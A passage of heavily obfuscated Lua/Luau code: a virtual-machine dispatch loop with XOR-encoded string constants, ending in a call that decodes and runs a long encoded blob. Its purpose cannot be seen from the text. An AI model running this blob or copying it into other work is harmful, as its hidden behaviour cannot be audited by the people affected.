Fe(36788,13812,20989)else id=(function(...)for Sa,C,la,ob,xb,of,ac,yf,N,Ac,Ye,We,sb,Ka,kd,Kb,Wa,de,tb,mb in...do wd{Sa,C,la,ob,xb,of,ac,yf,N,Ac,Ye,We,sb,Ka,kd,Kb,Wa,de,tb,mb}end wd(-2)end);lf[A],a_=Ee(id),o_[18671]or Fe(21260,18671,11022)end elseif a_<36039 then if a_<=35648 then if(Ga>209)then a_=o_[-27636]or Fe(37213,-27636,23636)continue else a_=o_[-21153]or Fe(95393,-21153,33822)continue end a_=o_[30622]or Fe(62873,30622,18184)else if Ga>237 then a_=o_[-11197]or Fe(103043,-11197,4240)continue else a_=o_[32183]or Fe(110073,32183,542)continue end a_=o_[-4275]or Fe(45899,-4275,31294)end elseif a_<=36039 then Qb[2]=Qb[3][Qb[1]];Qb[3]=Qb;Qb[1]=2;a_,Md[ge]=o_[-17968]or Fe(29444,-17968,23846),nil else if(Z[ca[59147]])then a_=o_[-5669]or Fe(96746,-5669,35460)continue else a_=o_[8227]or Fe(42977,8227,27024)continue end a_=o_[-17409]or Fe(32912,-17409,18433)end elseif a_>38088 then if Ga>231 then a_=o_[32335]or Fe(100031,32335,10367)continue else a_=o_[13489]or Fe(100197,13489,56138)continue end a_=o_[-31729]or Fe(16962,-31729,35639)elseif a_<37882 then id=id+Qb;se_=id if id~=id then a_=o_[-26341]or Fe(50859,-26341,5854)else a_=4041 end elseif a_>37882 then a_,Ad,hf,A=31126,ca[4910],Fd[d_+1],nil else db=ic[47620];ce=Md[db]if ce==nil then a_=o_[-22581]or Fe(18963,-22581,19546)continue end a_=o_[-10886]or Fe(113137,-10886,58588)end elseif a_>=16789 then if a_<26717 then if a_>=22248 then if a_<25328 then if a_<=23387 then if a_<22775 then if a_<=22248 then Ad=Jb(hf)if Ad~=nil and Ad[md('\159\223\212\180\229\207','\192\128\189')]~=nil then a_=o_[5125]or Fe(79366,5125,54264)continue elseif(hb(hf)==md('\215\17\193\28\198','\163p'))then a_=o_[32698]or Fe(31500,32698,52954)continue else a_=o_[-22949]or Fe(50143,-22949,11661)continue end a_=o_[-22284]or Fe(64749,-22284,27999)else d_+=ca[16270];a_=o_[-3571]or Fe(63554,-3571,16695)end elseif a_<=23021 then if a_>22775 then d_-=1;Fd[d_],a_={[43372]=124,[59147]=vd(ca[59147],55),[47620]=vd(ca[47620],178),[49643]=0},o_[24292]or Fe(5246,24292,58667)else d_+=ca[16270];a_=o_[-5124]or Fe(62059,-5124,15134)end else a_,Z[ca[49643]]=o_[-6121]or Fe(31513,-6121,50568),Z[ca[59147]]-ca[55530]end elseif a_<24830 then if Ga>32 then a_=o_[18267]or Fe(74408,18267,51476)continue else a_=o_[7418]or Fe(27181,7418,50335)continue end a_=o_[-20077]or Fe(7368,-20077,60601)elseif a_<=24830 then Ad=Jb(hf)if(Ad~=nil and Ad[md('X\172as\150z','\a\243\b')]~=nil)then a_=o_[-18901]or Fe(113408,-18901,8236)continue else a_=o_[-29913]or Fe(116781,-29913,60248)continue end a_=o_[-23152]or Fe(107692,-23152,45645)else Z[ca[47620]],a_=id,o_[-21529]or Fe(12073,-21529,65112)end elseif a_<25895 then if a_<=25696 then if a_>25482 then d_-=1;Fd[d_],a_={[43372]=34,[59147]=vd(ca[59147],67),[47620]=vd(ca[47620],136),[49643]=0},o_[-14278]or Fe(28382,-14278,48843)elseif a_>25328 then Z[ca[47620]]=pc(ca[2748]);d_+=1;a_=o_[-22334]or Fe(30928,-22334,49345)else we=Hd if Xb~=Xb then a_=o_[-5705]or Fe(115291,-5705,55594)else a_=o_[736]or Fe(103631,736,56410)end end else Z[ca[59147]],a_=Z[ca[49643]]+ca[55530],o_[-29446]or Fe(12547,-29446,63606)end elseif a_<=26546 then if a_>26240 then Xb=se_ if oc~=oc then a_=o_[12303]or Fe(20735,12303,39082)else a_=52392 end elseif a_<=25895 then if Ga>238 then a_=o_[12497]or Fe(7877,12497,58471)continue else a_=o_[1140]or Fe(27766,1140,14936)continue end a_=o_[-24426]or Fe(60504,-24426,15689)else a_,Qb[(Xb-117)]=o_[28361]or Fe(462,28361,3077),Kf[ic[47620]+1]end elseif a_>26663 then a_,Qb[(Xb-117)]=o_[15387]or Fe(10306,15387,13697),ce else da(Qb,1,hf,Ad+3,Z);Z[Ad+2]=Z[Ad+3];d_+=ca[16270];a_=o_[2123]or Fe(113436,2123,34181)end elseif a_<19353 then if a_<=18490 then if a_>=17785 then if a_<=18460 then if a_>17785 then se_=se_+Hd;Xb=se_ if se_~=se_ then a_=o_[10387]or Fe(12973,10387,64212)else a_=52392 end else if Ga>2 then a_=o_[5764]or Fe(57260,5764,20223)continue else a_=o_[-24850]or Fe(4430,-24850,59109)continue end a_=o_[-1651]or Fe(30655,-1651,47594)end else a_,se_=o_[-7311]or Fe(114330,-7311,28999),se_..Hc(vd(Pe(ge,(ic-10)+1),Pe(Qb,(ic-10)%#Qb+1)))end elseif a_<=16789 then da(Qb,1,se_,Ad,Z);a_=o_[-24569]or Fe(8946,-24569,60071)else d_+=ca[16270];a_=o_[-22252]or Fe(1723,-22252,55022)end elseif a_<=18807 then if a_>18773 then a_,Z[ca[59147]]=o_[-6281]or Fe(37068,-6281,22709),ca[55530]/Z[ca[47620]]else if(Xb>=0 and oc>Hd)or((Xb<0 or Xb~=Xb)and oc<Hd)then a_=o_[340]or Fe(80378,340,38616)else a_=42594 end end else oc,Hd=Z[Ad+2],nil;Xb=oc;Hd=ie(Xb)==md('\197V(\201F7','\171#E')if not Hd then a_=o_[1960]or Fe(113536,1960,62557)continue end a_=20552 end elseif a_<=20392 then if a_<19718 then if a_>19353 then if(Ga>224)then a_=o_[-9888]or Fe(66869,-9888,42309)continue else a_=o_[-29538]or Fe(116903,-29538,44933)continue end a_=o_[-20310]or Fe(60490,-20310,15679)else da(Fc[34894],1,hf,Ad,Z);a_=o_[-13049]or Fe(36095,-13049,23722)end elseif a_>20335 then d_+=ca[16270];a_=o_[-1711]or Fe(49560,-1711,2825)elseif a_<=19718 then ge,Qb=hf(A,id);id=ge if id==nil then a_=o_[-21647]or Fe(57228,-21647,8693)else a_=o_[-21860]or Fe(113422,-21860,59946)end else Hd=Qb if se_~=se_ then a_=o_[12693]or Fe(8718,12693,4217)else a_=o_[-15161]or Fe(75505,-15161,40352)end end elseif a_>=21153 then if a_<=21153 then if(Ga>86)then a_=o_[18561]or Fe(126767,18561,62109)continue else a_=o_[21142]or Fe(70785,21142,47993)continue end a_=o_[-2760]or Fe(61559,-2760,14626)else if Ga>34 then a_=o_[-2711]or Fe(122610,-2711,3867)continue else a_=o_[19448]or Fe(111151,19448,52145)continue end a_=o_[32752]or Fe(25958,32752,46099)end elseif a_<=20552 then if(ge>0)then a_=o_[-9450]or Fe(76927,-9450,36787)continue else a_=o_[-25758]or Fe(30813,-25758,59069)continue end a_=o_[7584]or Fe(53614,7584,6171)else Ad=Jb(hf)if(Ad~=nil and Ad[md('\238\\\180\197f\175','\177\3\221')]~=nil)then a_=o_[13563]or Fe(29096,13563,26330)continue else a_=o_[-28432]or Fe(130757,-28432,59052)continue end a_=o_[25248]or Fe(125605,25248,54657)end elseif a_>30994 then if a_>=33787 then if a_>=34359 then if a_>=34793 then if a_<=35103 then if a_>34793 then a_,A[(se_-187)]=o_[-5638]or Fe(32096,-5638,21699),Kf[oc[47620]+1]else if Ga>21 then a_=o_[13295]or Fe(22113,13295,55577)continue else a_=o_[-23919]or Fe(121859,-23919,1698)continue end a_=o_[-26561]or Fe(49549,-26561,3060)end else if Ga>192 then a_=o_[-28265]or Fe(71290,-28265,40928)continue else a_=o_[-15235]or Fe(33918,-15235,20565)continue end a_=o_[24958]or Fe(24463,24958,41466)end elseif a_<=34359 then if Ga>69 then a_=o_[-20204]or Fe(127420,-20204,49283)continue else a_=o_[-5830]or Fe(100374,-5830,60440)continue end a_=o_[24221]or Fe(64713,24221,19640)else if Ga>228 then a_=o_[-23124]or Fe(27493,-23124,44824)continue else a_=o_[-1519]or Fe(5050,-1519,6663)continue end a_=o_[-27953]or Fe(41983,-27953,28074)end elseif a_>=34015 then if a_>34015 then if Ga>95 then a_=o_[-25485]or Fe(116980,-25485,62342)continue else a_=o_[-29485]or Fe(93611,-29485,35108)continue end a_=o_[17426]or Fe(37434,17426,23407)else if(Ga>52)then a_=o_[-3364]or Fe(33704,-3364,30167)continue else a_=o_[2165]or Fe(126864,2165,40965)continue end a_=o_[18478]or Fe(1640,18478,55065)end elseif a_>33787 then a_,ge=o_[-4203]or Fe(56626,-4203,22089),ge..Hc(vd(Pe(A,(Hd-6)+1),Pe(id,(Hd-6)%#id+1)))else if(Ga>132)then a_=o_[32400]or Fe(98335,32400,44437)continue else a_=o_[2950]or Fe(55680,2950,11402)continue end a_=o_[25079]or Fe(38950,25079,24915)end elseif a_<33038 then if a_<=31346 then if a_<=31258 then if a_>31126 then ic=ka(oc)if ic==nil then a_=o_[27869]or Fe(18700,27869,64973)continue end a_=10828 else id,ge=hf[55530],ca[55530];ge=md('\135\226\144','{')..ge;Qb='';Hd,oc,se_,a_=1,(#id-1)+38,38,12868 end else if(Ga>43)then a_=o_[-31320]or Fe(18517,-31320,16474)continue else a_=o_[-8363]or Fe(125822,-8363,56424)continue end a_=o_[15328]or Fe(23804,15328,44197)end else ge=ge+se_;oc=ge if ge~=ge then a_=o_[-24071]or Fe(52718,-24071,30401)else a_=3347 end end elseif a_<=33486 then if a_>33164 then if(ic>=0 and Hd>Xb)or((ic<0 or ic~=ic)and Hd<Xb)then a_=o_[26641]or Fe(99894,26641,9567)else a_=o_[-8134]or Fe(108306,-8134,35597)end elseif a_<=33038 then Ad,hf=ca[59147],ca[47620];A=hf-1 if A==-1 then a_=o_[-15910]or Fe(64674,-15910,20297)continue else a_=o_[-26043]or Fe(112671,-26043,26525)continue end a_=o_[4327]or Fe(123639,4327,3622)else ge=ka(hf)if ge==nil then a_=o_[9494]or Fe(28490,9494,7143)continue end a_=7495 end else d_+=ca[16270];a_=o_[-21490]or Fe(23893,-21490,44124)end elseif a_<=29113 then if a_>=28483 then if a_<=28966 then if a_<28854 then a_,Z[ca[49643]]=o_[26732]or Fe(64128,26732,17137),Z[ca[47620]]/Z[ca[59147]]elseif a_<=28854 then Cf'';a_=o_[18618]or Fe(27323,18618,49159)else Cf'';a_=o_[16345]or Fe(56092,16345,17575)end elseif a_<=28983 then Ad=h[ca[55530]+1];hf=Ad[50097];A=pc(hf);Z[ca[59147]]=zd(Ad,A);a_,Qb,ge,id=o_[-27762]or Fe(9759,-27762,5091),1,(hf)+187,188 else d_-=1;a_,Fd[d_]=o_[9516]or Fe(56438,9516,11555),{[43372]=172,[59147]=vd(ca[59147],61),[47620]=vd(ca[47620],156),[49643]=0}end elseif a_>26970 then if a_<=27359 then if(Ga>61)then a_=o_[30905]or Fe(12901,30905,13412)continue else a_=o_[7962]or Fe(117640,7962,46263)continue end a_=o_[-31410]or Fe(15499,-31410,3326)else hf,A,id=Md if hb(hf)~=md('\206\48\180\245\220,\181\248','\168E\218\150')then a_=o_[-26134]or Fe(101343,-26134,40634)continue end a_=o_[10283]or Fe(109167,10283,4815)end elseif a_>=26896 then if a_>26896 then if(Qb==-2)then a_=o_[-22733]or Fe(71889,-22733,32814)continue else a_=o_[18949]or Fe(25477,18949,3653)continue end a_=o_[-22029]or Fe(5311,-22029,58602)else Cf'';a_=o_[-23491]or Fe(129491,-23491,8015)end else Z[ca[47620]],a_=Z[ca[49643]]*ca[55530],o_[-6883]or Fe(60629,-6883,15580)end elseif a_<=29857 then if a_<=29629 then if a_>=29315 then if a_<=29315 then Z[ca[59147]],a_=A,o_[-19954]or Fe(32176,-19954,23486)else if Qb[1]>=ca[59147]then a_=o_[-31798]or Fe(24953,-31798,7803)continue end a_=o_[-8797]or Fe(62068,-8797,30869)end else d_+=ca[16270];a_=o_[17814]or Fe(3506,17814,57319)end elseif a_<=29852 then d_-=1;a_,Fd[d_]=o_[-19265]or Fe(52583,-19265,7186),{[43372]=202,[59147]=vd(ca[59147],79),[47620]=vd(ca[47620],248),[49643]=0}else ge,Qb=hf[20286],ca[20286];Qb=md('Z?M','\166')..Qb;se_='';a_,Xb,oc,Hd=o_[20654]or Fe(124789,20654,2589),1,10,(#ge-1)+10 end elseif a_<=30742 then if a_>29981 then oc=Fd[d_];d_+=1;Hd=oc[59147]if(Hd==0)then a_=o_[-12313]or Fe(25404,-12313,56113)continue else a_=o_[-8476]or Fe(19985,-8476,16022)continue end a_=o_[-19215]or Fe(23304,-19215,10795)else Qb[2]=Qb[3][Qb[1]];Qb[3]=Qb;Qb[1]=2;a_,Md[ge]=o_[-9299]or Fe(50812,-9299,21661),nil end else a_,Z[ca[59147]]=o_[-10069]or Fe(77412,-10069,35818),A[ca[20286]]end elseif a_<7495 then if a_>4077 then if a_>=5942 then if a_>6796 then if a_<=7102 then if a_>6844 then d_+=1;a_=o_[-24824]or Fe(52735,-24824,8106)else hf,A,id=Md if hb(hf)~=md("\'\226%\16\53\254$\29",'A\151Ks')then a_=o_[4793]or Fe(113123,4793,56582)continue end a_=o_[13503]or Fe(52638,13503,23907)end else if(ca[49643]==186)then a_=o_[16906]or Fe(123115,16906,60515)continue else a_=o_[-10090]or Fe(6128,-10090,61193)continue end a_=o_[-25801]or Fe(112736,-25801,33041)end elseif a_<=6453 then if a_<6294 then oc=ka(ge)if oc==nil then a_=o_[4175]or Fe(5959,4175,15248)continue end a_=57079 elseif a_<=6294 then hf[20286]=id;ge,a_=nil,o_[16895]or Fe(102415,16895,20347)else Z[ca[49643]],a_=Z[ca[59147]][Z[ca[47620]]],o_[15631]or Fe(17023,15631,35626)end elseif a_>6704 then hf[31900],a_=ge,o_[-29277]or Fe(22911,-29277,29334)else hf[55530]=A if Ad==2 then a_=o_[24867]or Fe(76609,24867,45669)continue elseif(Ad==3)then a_=o_[23427]or Fe(21641,23427,25128)continue else a_=o_[1383]or Fe(22645,1383,29608)continue end a_=55802 end elseif a_>4626 then if a_<5355 then pe,d_,a_,Md,lf,xc=-1,1,2926,Fb({},{[md('&SL\22hD','y\f!')]=md('\176\181','\198')}),Fb({},{[md('\226\130\241\210\185\249','\189\221\156')]=md('\188\164','\215')}),false elseif a_<=5355 then if(Ga>138)then a_=o_[9655]or Fe(31223,9655,57901)continue else a_=o_[31640]or Fe(29752,31640,15834)continue end a_=o_[-16001]or Fe(40138,-16001,27839)else if ca[49643]==216 then a_=o_[-2154]or Fe(125920,-2154,47534)continue else a_=o_[17612]or Fe(121052,17612,53254)continue end a_=o_[3627]or Fe(36627,3627,20870)end elseif a_>=4323 then if a_<=4372 then if a_>4323 then Cf'';a_=o_[-13417]or Fe(130821,-13417,63756)else if(Ga>131)then a_=o_[-8118]or Fe(130506,-8118,53328)continue else a_=o_[29645]or Fe(29252,29645,9594)continue end a_=o_[-26272]or Fe(15227,-26272,558)end else if Z[ca[59147]]==Z[ca[2748]]then a_=o_[-6801]or Fe(92739,-6801,36116)continue else a_=o_[26754]or Fe(98699,26754,55829)continue end a_=o_[10617]or Fe(62951,10617,18322)end elseif a_<=4111 then hf,A,id=wb(hf);a_=o_[-10848]or Fe(60458,-10848,23814)else if(Ga>165)then a_=o_[-4596]or Fe(108616,-4596,39142)continue else a_=o_[2800]or Fe(103716,2800,14328)continue end a_=o_[15911]or Fe(62241,15911,14928)end elseif a_<=2564 then if a_>=2111 then if a_<=2130 then if a_<=2112 then if a_>2111 then Z[ca[59147]],a_=Z[ca[47620]],o_[23464]or Fe(4315,23464,55502)else Hd=Hd+ic;we=Hd if Hd~=Hd then a_=o_[12783]or Fe(100930,12783,8467)else a_=33486 end end else if Ga>149 then a_=o_[-10187]or Fe(108370,-10187,14309)continue else a_=o_[4960]or Fe(76817,4960,55088)continue end a_=o_[-13974]or Fe(10079,-13974,63050)end elseif a_>2437 then id,a_=pe-Ad+1,o_[16691]or Fe(98778,16691,12083)else if(Xb>=0 and oc>Hd)or((Xb<0 or Xb~=Xb)and oc<Hd)then a_=o_[-21495]or Fe(119034,-21495,58989)else a_=18490 end end elseif a_<=544 then if a_>235 then d_+=1;a_=o_[-12113]or Fe(44921,-12113,32296)elseif a_>122 then d_+=ca[16270];a_=o_[2288]or Fe(51883,2288,4830)else if(Ga>240)then a_=o_[6182]or Fe(126956,6182,7430)continue else a_=o_[32416]or Fe(23870,32416,1440)continue end a_=o_[8555]or Fe(50,8555,51559)end elseif a_>1221 then if Z[ca[59147]]<Z[ca[2748]]then a_=o_[17284]or Fe(20318,17284,13025)continue else a_=o_[-14035]or Fe(21091,-14035,31114)continue end a_=o_[86]or Fe(30348,86,50933)else Z[ca[47620]]=ca[49643]==1;d_+=ca[59147];a_=o_[4854]or Fe(30966,4854,49315)end elseif a_<3644 then if a_<=3347 then if a_<2926 then if(id<=hf)then a_=o_[32491]or Fe(128644,32491,7589)continue else a_=o_[-29686]or Fe(60264,-29686,12825)continue end a_=o_[27555]or Fe(113226,27555,33599)elseif a_>2926 then if(se_>=0 and ge>Qb)or((se_<0 or se_~=se_)and ge<Qb)then a_=o_[1091]or Fe(111366,1091,54457)else a_=o_[17851]or Fe(10463,17851,8911)end else if not xc then a_=o_[-22120]or Fe(93906,-22120,44805)continue end a_=o_[5846]or Fe(21285,5846,16890)end else Ad=ca[55530];Z[ca[59147]][Ad]=Z[ca[49643]];d_+=1;a_=o_[-28732]or Fe(325,-28732,51276)end elseif a_<4041 then if a_<=3644 then if Ga>176 then a_=o_[-14852]or Fe(14037,-14852,1756)continue else a_=o_[29131]or Fe(112525,29131,42973)continue end a_=o_[-26564]or Fe(50467,-26564,5206)else if(Ga>225)then a_=o_[-17143]or Fe(23479,-17143,10259)continue else a_=o_[-9796]or Fe(115219,-9796,61636)continue end a_=o_[-2795]or Fe(52176,-2795,5569)end elseif a_<=4041 then if(Qb>=0 and id>ge)or((Qb<0 or Qb~=Qb)and id<ge)then a_=o_[-14249]or Fe(53166,-14249,4571)else a_=30742 end else Cf'';a_=o_[-20562]or Fe(19674,-20562,57476)end elseif a_>=12692 then if a_<13634 then if a_<12983 then if a_>12818 then Xb=se_ if oc~=oc then a_=o_[3949]or Fe(65216,3949,29572)else a_=12818 end elseif a_<12766 then Qb=Qb+oc;Hd=Qb if Qb~=Qb then a_=o_[-19345]or Fe(35523,-19345,31668)else a_=o_[-24704]or Fe(118800,-24704,53121)end elseif a_<=12766 then ge,Qb=hf[20286],ca[20286];Qb=md('\217\188\206','%')..Qb;se_='';a_,Xb,oc,Hd=o_[-20219]or Fe(348,-20219,1262),1,213,(#ge-1)+213 else if(Hd>=0 and se_>oc)or((Hd<0 or Hd~=Hd)and se_<oc)then a_=o_[-30356]or Fe(111892,-30356,43344)else a_=60565 end end elseif a_<=13383 then if a_<=13160 then if a_>12983 then Ad,hf=nil,vd(ca[11057],1221);Ad=if hf<32768 then hf else hf-65536;A=Ad;a_,Z[vd(ca[59147],101)]=o_[-13252]or Fe(38349,-13252,26548),A else if(Ga>196)then a_=o_[-21247]or Fe(5206,-21247,31169)continue else a_=o_[-5905]or Fe(110981,-5905,64798)continue end a_=o_[31348]or Fe(26083,31348,46998)end else if Ga>10 then a_=o_[15376]or Fe(112011,15376,63605)continue else a_=o_[29925]or Fe(80834,29925,56435)continue end a_=o_[-15870]or Fe(9961,-15870,63128)end elseif a_<=13424 then hf,a_=ge,o_[-23161]or Fe(78779,-23161,34339)continue else Ad=ca[55530];Z[ca[49643]]=Z[ca[47620]][Ad];d_+=1;a_=o_[12460]or Fe(22281,12460,42616)end elseif a_>14873 then if a_>16339 then if(Ga>88)then a_=o_[-21556]or Fe(119986,-21556,51195)continue else a_=o_[6503]or Fe(109121,6503,5233)continue end a_=o_[-5640]or Fe(34066,-5640,22407)elseif a_<15514 then A=Fd[d_+ca[16270]]if lf[A]==nil then a_=o_[-23949]or Fe(5594,-23949,24954)continue end a_=o_[29471]or Fe(3844,29471,28422)elseif a_>15514 then ic=oc if Hd~=Hd then a_=o_[12558]or Fe(115927,12558,39695)else a_=18773 end else Xb={[2]=Z[oc[47620]],[1]=2};Xb[3]=Xb;A[(se_-187)],a_=Xb,o_[-7438]or Fe(126396,-7438,51095)end elseif a_>14497 then if a_<=14707 then id..=Z[oc];a_=o_[5315]or Fe(30449,5315,14327)else d_-=1;Fd[d_],a_={[43372]=86,[59147]=vd(ca[59147],159),[47620]=vd(ca[47620],207),[49643]=0},o_[3144]or Fe(113779,3144,36134)end elseif a_<14341 then hf,A,id=wb(hf);a_=o_[-4356]or Fe(77431,-4356,40663)elseif a_<=14341 then Ad,hf,a_=Fd[d_],nil,o_[14985]or Fe(117093,14985,63034)else A,a_=Qb,6704 continue end elseif a_>=10749 then if a_>11190 then if a_<12217 then if a_>11348 then if(Ga>173)then a_=o_[-2005]or Fe(13168,-2005,2448)continue else a_=o_[23571]or Fe(74411,23571,48870)continue end a_=o_[17113]or Fe(23569,17113,44160)else if(ca[49643]==50)then a_=o_[11685]or Fe(128217,11685,56252)continue else a_=o_[-17795]or Fe(28388,-17795,51888)continue end a_=o_[-29355]or Fe(5743,-29355,59162)end elseif a_<=12217 then hf,A,id=lf if hb(hf)~=md('\96\149$Yr\137%T','\6\224J:')then a_=o_[4086]or Fe(111777,4086,51310)continue end a_=o_[-12593]or Fe(32027,-12593,60465)else se_=id if ge~=ge then a_=o_[15429]or Fe(45809,15429,31392)else a_=4041 end end elseif a_>11013 then if a_<=11189 then ge,Qb=hf(A,id);id=ge if id==nil then a_=57605 else a_=o_[-3665]or Fe(123377,-3665,64323)end else Ad=Kf[ca[47620]+1];a_,Z[ca[59147]]=o_[-15305]or Fe(27603,-15305,46534),Ad[3][Ad[1]]end elseif a_<=10828 then if a_<=10749 then if Ga>140 then a_=o_[2299]or Fe(104382,2299,8363)continue else a_=o_[22150]or Fe(109336,22150,5939)continue end a_=o_[6507]or Fe(114456,6507,33161)else Z[Ad+2]=ic;a_,oc=o_[-22624]or Fe(22429,-22624,57890),ic end else Cf(Qb);a_=o_[-7418]or Fe(101810,-7418,45555)end elseif a_<=9479 then if a_>7933 then if a_>8017 then if not(hf<=oc)then a_=o_[10244]or Fe(74454,10244,55920)continue end a_=o_[17698]or Fe(112856,17698,32969)else a_,Z[ca[59147]]=o_[-570]or Fe(17154,-570,35447),nil end elseif a_<7919 then Z[Ad]=ge;hf,a_=ge,o_[23292]or Fe(21450,23292,11392)elseif a_<=7919 then db={[2]=Z[ic[47620]],[1]=2};db[3]=db;Qb[(Xb-117)],a_=db,o_[28669]or Fe(16352,28669,17123)else a_,Z[ca[49643]]=o_[12966]or Fe(54265,12966,7592),Z[ca[59147]]/ca[55530]end elseif a_>10488 then d_+=1;a_=o_[15708]or Fe(37759,15708,23082)elseif a_>10339 then oc,a_=oc..Hc(vd(Pe(Qb,(we-152)+1),Pe(se_,(we-152)%#se_+1))),o_[-8447]or Fe(5628,-8447,55514)else if Z[ca[59147]]<=Z[ca[2748]]then a_=o_[13146]or Fe(18318,13146,28184)continue else a_=o_[-27534]or Fe(426,-27534,663)continue end a_=o_[-27787]or Fe(52403,-27787,7398)end until a_==18020 end return function(...)local Od,kf,_f,e_,fd,Ta,_b,Mb,va,Cd,jd;Od,kf=function(za,k,Ub)kf[Ub]=bc(k,27351)-bc(za,3942)return kf[Ub]end,{};Ta=kf[236]or Od(14748,83524,236)repeat if Ta>43977 then if Ta<=50497 then if Ta<=45591 then return Ab(va,2,e_)else Ta,_f=kf[-7700]or Od(46418,40584,-7700),ie(_f)end else Mb,jd,_b=jc(...),pc(_e[52049]),{[6878]=0,[34894]={}};da(Mb,1,_e[11490],0,jd)if _e[11490]<Mb[md('\149','\251')]then Ta=kf[-13895]or Od(55618,76755,-13895)continue end Ta=kf[-27949]or Od(43076,82199,-27949)end elseif Ta>=28322 then if Ta<33950 then Ta=kf[12407]or Od(42483,126174,12407)continue elseif Ta<=33950 then va,e_=xf(v(Zd,jd,_e[5449],_e[12622],_b))if(va[1])then Ta=kf[13621]or Od(6097,40985,13621)continue else Ta=kf[29754]or Od(57734,127102,29754)continue end Ta=28322 else _f,fd=va[2],nil;Cd=_f;fd=ie(Cd)==md('\172n\16\182t\5','\223\26b')if fd==false then Ta=kf[-26728]or Od(54824,128088,-26728)continue end Ta=14891 end elseif Ta<=14891 then return Cf(_f,0)else va,e_=_e[11490]+1,Mb[md('\155','\245')]-_e[11490];_b[6878]=e_;da(Mb,va,va+e_-1,1,_b[34894]);Ta=kf[14886]or Od(29508,92695,14886)end until Ta==56180 end end return zd(Nb,Oc)end)local fe;fe,qf={[0]=0},function()fe[0]=fe[0]+1 return{[3]=fe,[1]=fe[0]}end;S=gf return(function()local z,Ie,T,Jc;z={[1]=2,[2]=S};z[3]=z;Jc={[1]=2,[2]=Qe};Jc[3]=Jc;Ie={[1]=2,[2]=pb};Ie[3]=Ie;T={[1]=2,[2]=xe};T[3]=T return S(H'8fn9OmQeHfOIzZkqiMyYKsyBYaIfgGGidhZyGHCCY6LygmGidhdyGYjMmSqIz5gqiM6bKsyGYaIfhmCizIdhoh+HY6KIy5oqjqzh+HYQcBt2EXAadhRwGnYVchpwgmKi8oJhonYWchmOqeD4iLbTPHYVcBqOC+8YIGQeHfP7G2geHfMDcBLk8dU+erqZwfWwL+eYQ90vrdZuHz2pWNre7SY6x/h9thK3Ndz0gmmGkdDxItXGnWP7dA/pDZhzUD+brCh64tfPoy1FsXzC7Wto+9UoAz/qMJ1NJV44chedAg9OhYFDwPmd/dJpiC5SC3/SM2ysqyVVyD/+O7uclqoXsZ2jnWTWcIIqCKQ9pgWP1IbRDQLXcERrF7YDwnowf/BUxD0S7aJqKnvxJdyEz4OitVp6Ont1yuQSIoUs4hDOfA7lAKw2FzJm+lvciIcAN2T3BkZJuGOmDBTigD7/mnk/OvdQrupW/EBqClA1xKdtJBnm1LAlcdQ/LZKXlyAc1vO2J+DJ34/MsSOQ/VVEJyl/tBTOSnHNkMUhLHJHK31CjfGxKe35vfaePxsTzRIwvZM8kn5OAqWGRYCo+jkgVbBxX+bodsEjwhOfbEFYBUyM7fofVZYslo8jpYXA2zr+v3IMelnoH4fgP25xWY+sZApXyMmDg02juUCmX0pCsW8531pFmtZjCqKAXxHow8TeQDzBSEIknaK/Bndu+V7wx+0K92Y27uDfzKwkpvIejvI1CBKSD2MQ/KNjJQt38/dcQaaddmSP3F+FbNhwu6vLUIwnysCCTYjPrCvr19kzNVIK12Y9zHqTHpJ6kONJS/o3EZYa7cIvziH1IAdeX5JtOKnpzrHjvUEKSAipjOXIdHQFut7aQPFVvGUANZG6eYALkMfLPbj/aOw64r3lics1A/FXKnt6zeFQkDrpOE1M1RMF9lM5dS+RM82iMY0WneIHapyU1hsST0bdxWxIyxaxqfbuPN3TN9xCxKFAgUD3sLnmImAdeKn33rbqyPB93zsIkf68IBj82eDBFsRW5aQjcNFsMoC5KOkm8D2mjd0uBmXKaqq2j5cYVI40lMc3SIJXEDpfDZqpGElcAOpR0C+j+CT2Tm6o+sNWf45r+nH3Uu/T6SJMbBf2GOPzHvmVVwEr848g+qgEj2nDCdMX9aBAF0I/dy65w04WE1M5YQbpjd+w10qY6q6uIJ/uGsLgiOh7n3X0G2xv+dy+0DvBof6fNITIUM1EbAe/CRA705Hecyt3ZrKDfAWtlf8pMvCvRewIWLPwTkR7eJwNsNJzp2ygVq1XlRPvXi0kwv89Yeq3lqoJkSNjDjzYWAXF/jH9B/nopVQE1Zo2nsaoAoscMiI9mRyinZ1X6V0fHJqP35U3LkjNrutf7o9j1FIuQbr6t2scw+woo36n2jbHs4cXGEd8VCViutNbPiO7cJcPvuitcDinbzeAC1I+Z7HFue6E5nWEBBnCtRGTLN1064KUMv8uIH6rAnAOV9QzLq3yhxYASNFHjwOwKIRWS1J7wF9LtHcZea3kQaeZGu3lTN5sRL3S+BpK12I8p5A3PyKfBin1mewKkFJveuJBcba5lLPX+8Z3cZaDY0Q9AwkhQJZARqpyewFKNMlq9icSarQ/EByuH2rwKdCeDiuUSVhNiMzfyygvUuFVbrkUuJoQADlhwf1X4OKBQgIVCacEK6Bgtmad9I9lDqB/RnrTgL5q0DjMZThRxbwpbaNhlnbNTnUVIm9o1EBRoRJQU8bzQGl//YCkhqsJHDcv8xj7HCjEnHfrsl0eEozB5btHU9FCCG42Wy4ARYVuVmRzOJL3mm1ufHWEs6QodYlDYjql385+0f4nY1DyKngjEYjGcKp32u55RQZzuph6igA6wK/kYydkt/sE20UwW/ubAFRMxY5ssOko/WANoPspOUW6oKo2E1iJGoFrtkbrZLoNdGxv+PIsEc8Hd2wKzMzlbigzOj2YE/9Rt25K9Hk6GcgkA87Uk3KdQqatGXpA4Pr8pwI/HzOEZooAxt63MSAlLLXiFyzAvb2MWT7Dgoo4/fogAEdX0w1sQ0RE62BGo3KYJGggODFQalgyCWDgUtTlFNOk2vqQAcu5ZRm376534RNTnFE0cFRf2kNlNSnENeKMoLJhsojverLME/jzMVoDca3Th0v22xi5FNjSkZqhQkoAKNXMDANb621/FPHgDR6bbfVGZW5O41RrfmBN+QXJf0nsvDkG6E7LJmy0l1wRfLYbtVlkSzKxgf0VE/ZAVtIMdacp831RAlO5Dd/KsQhdBWjcOqYg6+025ofuBsUf+0ZlHB3zG3AipO9JnerXpguHezr8M0XuMOqEjrs7sKWZB+H3vgtPBgQAwThJcW71ESBtZHtYPGGrHyWBNXvLehIg9RkdhsRlBCi4qOpohNoj78I01a7N0GAUArTzb1zJIggceY7zKAdW8ojaD0QhJ90yrJE07P4DgbS5UBp0To6Tg6NxjpIG/6eySLDRD5AgQgsUlWgS6qvouLIs5H3adPFfgSeZsk0YPJBau2j92GnQRzb147Th/k3ijNhGNf8JR8U0oq9kOBNDbaph54Us0pWi9suogmbubUiLf3+BKmMYm9RY